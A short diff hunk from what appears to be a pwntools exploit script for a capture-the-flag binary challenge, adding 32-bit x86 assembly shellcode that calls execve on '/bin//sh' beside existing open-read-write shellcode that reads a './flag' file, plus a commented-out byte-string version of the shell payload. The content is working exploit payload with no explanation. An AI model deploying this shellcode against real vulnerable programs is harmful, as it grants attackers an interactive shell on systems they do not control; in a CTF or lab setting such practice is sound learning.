@@ -182,6 +182,17 @@ csuEnd = 0x40059A
 shell = shellcraft.open("./flag")
 shell += shellcraft.read("eax", "esp", 100)
 shell += shellcraft.write(1, "esp", 100)
+shellcode = """
+xor eax,eax
+xor edx,edx
+push edx
+push 0x68732f2f
+push 0x6e69622f
+mov ebx,esp
+xor ecx,ecx
+mov al,0xB
+int 0x80
+"""
 # orw
 # shellcode = asm(shell)
 # shellcode = b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
